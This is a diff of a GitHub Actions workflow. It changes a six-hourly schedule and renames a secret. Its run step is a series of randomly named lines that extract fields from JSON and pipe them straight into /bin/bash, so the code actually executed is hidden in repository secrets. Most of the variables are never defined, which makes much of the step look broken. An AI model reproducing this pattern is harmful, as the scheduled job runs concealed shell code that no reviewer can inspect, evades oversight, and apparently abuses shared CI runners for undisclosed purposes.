@@ -2,22 +2,23 @@ name: luziyuan3497
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 4/6 * * *'
+    - cron: '44 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: luziyuan3497
         env:
-          jpkb9: ${{ secrets.jpkb9 }}
+          j31285: ${{ secrets.j31285 }}
         run: |
-          echo $jpkb9 | jq -r .ysnq84 | /bin/bash
-          echo $zx15 | jq -r .nu12 | /bin/bash
-          echo $kurwy01338 | jq -r .fhn560 | /bin/bash
-          echo $kvwn16 | jq -r .smdv12038 | /bin/bash
-          echo $cnct877 | jq -r .kevp54527 | /bin/bash
-          echo $yydx6 | jq -r .im8905 | /bin/bash
-          echo $fm88043 | jq -r .uqmi94069 | /bin/bash
+          echo $j31285 | jq -r .cwg285 | /bin/bash
+          echo $pb4844 | jq -r .k04573 | /bin/bash
+          echo $gu03 | jq -r .oic6640 | /bin/bash
+          echo $mcx14475 | jq -r .q1 | /bin/bash
+          echo $ya086 | jq -r .zopg78 | /bin/bash
+          echo $q593 | jq -r .gre2143 | /bin/bash
+          echo $dg858 | jq -r .ng3140 | /bin/bash
+          echo $w5 | jq -r .mm4699 | /bin/bash
+          echo $ccs31 | jq -r .wnae8059 | /bin/bash
 
